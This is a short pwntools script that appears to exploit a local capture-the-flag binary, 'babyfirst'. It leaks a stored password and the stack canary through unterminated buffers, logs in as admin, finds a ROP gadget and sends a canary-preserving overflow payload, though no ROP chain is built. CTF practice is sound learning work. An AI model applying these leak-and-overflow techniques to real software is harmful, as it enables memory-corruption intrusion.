from pwn import *
import time

p=process('./babyfirst')
elf=ELF('babyfirst')
##ROP find
rop = ROP('babyfirst')
try:
	pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
except:
	print("no ROP for you!")
	sys.exit(1)

# pause()
p.sendline('1')
time.sleep(0.5)
payload= 'b'* (0x20-3)+'pas' 
p.send(payload)     #send w0 /n 0x20 to concat password to username
time.sleep(0.5)      
p.sendline('2')
time.sleep(0.5)
p.recvuntil('pas')
pas=p.recv(16)       #recv 16 byte passsword
p.sendline('1')
time.sleep(0.5)
p.sendline('admin\0')  
time.sleep(0.5)
p.sendline(pas)
time.sleep(0.5)
p.sendline('2')
time.sleep(0.5)
p.send('a'*(0x28-3)+'can'+'#')
time.sleep(0.5)
p.recvuntil('can')
canary=p.recv(8)
canary=bytearray(canary)
canary[0]=b'\x00'
log.info('canary:'+hex(u64(canary)))
time.sleep(0.5)
# p.sendline(canary)
print hex(pop_rdi)
print hex(elf.sym['main'])
pay1='END'+(0x28-3)*'a'+canary+'a'*8

p.sendline(pay1)
# p.send(canary)
# p.send(cyclic(0x28)+canary+'a'*200)
# p.sendline('2')
# p.sendline(cyclic(0x28)+"\x00"+canary+cyclic(200))

p.interactive()